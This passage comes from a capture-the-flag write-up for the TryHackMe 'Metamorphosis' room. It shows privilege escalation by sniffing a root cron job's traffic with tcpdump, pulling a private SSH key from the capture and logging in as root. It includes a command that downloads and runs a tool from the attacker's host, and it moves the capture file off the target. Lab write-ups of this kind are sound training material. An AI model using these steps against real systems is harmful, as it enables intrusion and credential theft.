╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
[...]
Files with capabilities (limited to 50):
/usr/sbin/tcpdump = cap_net_raw+ep
[...]
```

**I can sniff traffic with `tcpdump`?**

**I also run `pspy` on the target machine:**
```
┌──(root🌸siunam)-[/opt/pspy]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
www-data@incognito:/var/www/html$ wget http://10.9.0.253/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy;/tmp/pspy
[...]
2023/01/11 09:02:01 CMD: UID=0    PID=19229  | /usr/sbin/CRON -f 
2023/01/11 09:02:01 CMD: UID=0    PID=19232  | /bin/sh /root/req.sh 
2023/01/11 09:02:01 CMD: UID=0    PID=19231  | /bin/sh /root/req.sh 
2023/01/11 09:02:01 CMD: UID=0    PID=19230  | /bin/sh -c /root/req.sh 
[...]
2023/01/11 09:04:01 CMD: UID=0    PID=19239  | /bin/sh /root/req.sh 
2023/01/11 09:04:01 CMD: UID=0    PID=19238  | /bin/sh /root/req.sh 
2023/01/11 09:04:01 CMD: UID=0    PID=19237  | /bin/sh -c /root/req.sh 
2023/01/11 09:04:01 CMD: UID=0    PID=19236  | /usr/sbin/CRON -f
[...]
```

**Looks like every 2 minutes, `/root/req.sh` sh script will executed by root.** 

**Hmm... Let's try to sniff traffic in port 1027:**
```
www-data@incognito:/var/www/html$ tcpdump -i any -s 0 'tcp port 1027' -w /tmp/sniffing.cap
tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes

```

**Then wait 2 minutes, and exit:**
```
www-data@incognito:/var/www/html$ tcpdump -i any -s 0 'tcp port 1027' -w /tmp/sniffing.cap
tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
^C11 packets captured
22 packets received by filter
0 packets dropped by kernel
```

We've captured 11 packets!

**Let's transfer the captured packets!**
```
www-data@incognito:/var/www/html$ cd /tmp
www-data@incognito:/tmp$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# wget http://$RHOSTS:8000/sniffing.cap
```

**After that, we can use WireShark to inspect those packets:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# wireshark sniffing.cap
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111042017.png)

**Let's follow that HTTP stream!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111042109.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Metamorphosis/images/Pasted%20image%2020230111042126.png)

**Found a private SSH key!**

**Let's copy and paste that to our attacker machine:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# nano key     
                                                                                                       
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# chmod 600 key
```

**Then we should be able to SSH into `root`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Metamorphosis]
└─# ssh -i key root@$RHOSTS        
[...]
root@incognito:~# whoami;hostname;id;ip a
root
incognito
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:cb:fe:54:e3:8d brd ff:ff:ff:ff:ff:ff
    inet 10.10.14.138/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3139sec preferred_lft 3139sec
    inet6 fe80::cb:feff:fe54:e38d/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
root@incognito:~# cat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating SMB via CrackMapExec
2. Enumerating Rsync
3. Enumerating Hidden Directories & Files
4. Overriding Config File via Rsync
5. RCE (Remote Code Execution) via Union-Based SQL Injection
6. Sniffing HTTP Traffics via `tcpdump`